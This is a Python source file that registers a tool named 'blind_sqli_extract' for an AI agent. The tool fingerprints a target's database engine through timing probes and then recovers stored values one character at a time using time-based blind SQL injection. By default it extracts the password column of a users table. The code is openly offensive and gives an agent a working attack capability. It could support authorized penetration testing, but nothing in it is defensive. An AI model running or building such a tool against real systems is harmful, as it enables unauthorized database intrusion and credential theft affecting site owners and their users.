from claude_agent_sdk import tool

from engine.blind_extract import fingerprint_dbms, extract_string


@tool(
    "blind_sqli_extract",
    "Extract a database value using time-based blind SQL injection. "
    "Fingerprints the DBMS (MySQL / PostgreSQL / MSSQL / Oracle / SQLite) via "
    "timing probes, then reconstructs the target value character-by-character "
    "using binary search over an ASCII range. Each character costs O(log2(94)) "
    "approx 7 requests. Use when the target reflects no error output but you "
    "have confirmed a timing oracle on some parameter.",
    {
        "url": str,
        "param": str,
        "table": (str, True),
        "column": (str, True),
        "dbms": (str, True),
        "max_length": (int, True),
    },
)
async def tool_blind_sqli_extract(args):
    url = args.get("url")
    param = args.get("param")
    if not url or not param:
        return {"content": [{"type": "text",
                             "text": "url and param are required"}],
                "isError": True}
    table = args.get("table") or "users"
    column = args.get("column") or "password"
    dbms = args.get("dbms") or None
    max_length = int(args.get("max_length") or 64)
    try:
        if not dbms:
            dbms, _fp = fingerprint_dbms(url, param)
        if not dbms:
            return {"content": [{"type": "text",
                                 "text": f"no timing signal on param '{param}'"}],
                    "structuredContent": {"dbms": None, "extracted_value": ""}}
        result = extract_string(url, param, table, column, dbms=dbms,
                                 max_length=max_length)
    except Exception as e:
        return {"content": [{"type": "text",
                             "text": f"blind extract failed: {type(e).__name__}: {e}"}],
                "isError": True}
    extracted = result.get("extracted", "")
    if not extracted:
        return {"content": [{"type": "text",
                             "text": f"fingerprinted {dbms} but no characters recovered"}],
                "structuredContent": {"dbms": dbms, "extracted_value": "",
                                       "requests": result.get("requests")}}
    lines = [f"DBMS: {dbms}",
             f"Target: {table}.{column}",
             f"Extracted: {extracted}",
             f"Requests: {result.get('requests')}",
             f"Baseline: {result.get('baseline_ms')}ms"]
    return {"content": [{"type": "text", "text": "\n".join(lines)}],
            "structuredContent": {"dbms": dbms, "table": table, "column": column,
                                   "extracted_value": extracted,
                                   "requests": result.get("requests"),
                                   "baseline_ms": result.get("baseline_ms")}}
